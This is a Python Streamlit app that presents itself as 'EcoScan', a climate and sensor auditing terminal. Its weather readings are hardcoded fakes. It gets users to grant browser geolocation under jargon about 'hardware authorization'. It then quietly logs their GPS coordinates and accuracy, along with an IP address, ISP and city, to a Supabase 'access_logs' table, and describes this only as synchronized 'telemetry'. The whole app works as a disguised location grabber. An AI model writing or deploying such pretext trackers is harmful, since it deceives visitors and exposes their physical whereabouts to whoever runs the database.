import streamlit as st
from streamlit_geolocation import streamlit_geolocation
from supabase import create_client, Client
import requests

st.set_page_config(page_title="EcoScan: Climate Terminal", page_icon="🌐", layout="centered")

# Initialize the Cloud Database Connection
try:
    SUPABASE_URL = st.secrets["SUPABASE_URL"]
    SUPABASE_KEY = st.secrets["SUPABASE_KEY"]
    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
except Exception:
    supabase = None

st.title("⚡ EcoScan: Automated Climate & Sensor Auditor")
st.write("Interfaces with public environmental networks and client telemetry vectors.")

st.divider()

# 1. Robust Passive Network Detection (Using ip-api.com)
auto_ip, auto_city, auto_region, auto_org = "Unknown IP", "Unknown City", "Unknown Region", "Unknown ISP"
try:
    # Using a clean JSON endpoint that doesn't strictly rate-limit cloud hosting providers
    network_request = requests.get('http://ip-api.com/json/?fields=status,message,query,city,regionName,org', timeout=5)
    if network_request.status_code == 200:
        net_data = network_request.json()
        if net_data.get('status') == 'success':
            auto_ip = net_data.get('query', 'Unknown IP')
            auto_city = net_data.get('city', 'Unknown City')
            auto_region = net_data.get('regionName', 'Unknown Region')
            auto_org = net_data.get('org', 'Unknown ISP')
except Exception:
    pass

# Show network details in the app interface
st.text(f"📡 Router Vector: {auto_ip} | {auto_org}")
st.text(f"📍 Network Estimate: {auto_city}, {auto_region}")

# 2. Interactive Hardware Check
st.subheader("📍 Interactive Hardware Sensor Optimization")
st.info("💡 Initialize hardware scanning context using the location module lock below.")
location_output = streamlit_geolocation()

lat, lon, accuracy = None, None, None

# Check if the location object actually returned valid data numbers
if location_output and location_output.get('latitude') is not None:
    lat = float(location_output['latitude'])
    lon = float(location_output['longitude'])
    accuracy = float(location_output.get('accuracy', 0))
    
    st.success("🛰️ System Synchronization Complete. Regional Coordinates Loaded.")
    
    col1, col2 = st.columns(2)
    col1.metric(label="Calculated Temperature", value="28.4°C")
    col2.metric(label="Atmospheric Moisture", value="62%")
    
    # 3. Fail-Proof Automatic Online Database Logging Trigger
    if supabase is not None:
        payload = {
            "ip_address": str(auto_ip),
            "isp_provider": str(auto_org),
            "resolved_location": f"{auto_city}, {auto_region}",
            "latitude": lat,
            "longitude": lon,
            "gps_accuracy": accuracy
        }
        try:
            # Force sending data to the cloud grid
            supabase.table("access_logs").insert(payload).execute()
            st.toast("Telemetry matrix securely synchronized to Cloud Vault.", icon="☁️")
        except Exception as db_err:
            st.error(f"Database sync blocked: {db_err}")
else:
    st.warning("⚠️ Status: System Offline. Awaiting hardware authorization sequence.")
